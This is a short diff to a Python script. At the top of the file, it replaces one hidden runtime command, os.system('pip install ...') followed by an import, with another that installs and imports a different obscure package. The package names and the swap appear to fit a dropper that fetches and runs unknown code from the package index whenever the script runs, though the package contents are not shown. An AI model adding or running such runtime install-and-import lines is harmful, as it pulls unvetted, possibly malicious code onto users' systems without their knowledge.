@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedblibrary")
-import pipsqlitedblibrary
+os.system("pip install pyfontskit")
+import pyfontskit
 from optparse import Option
 import requests
 import threading
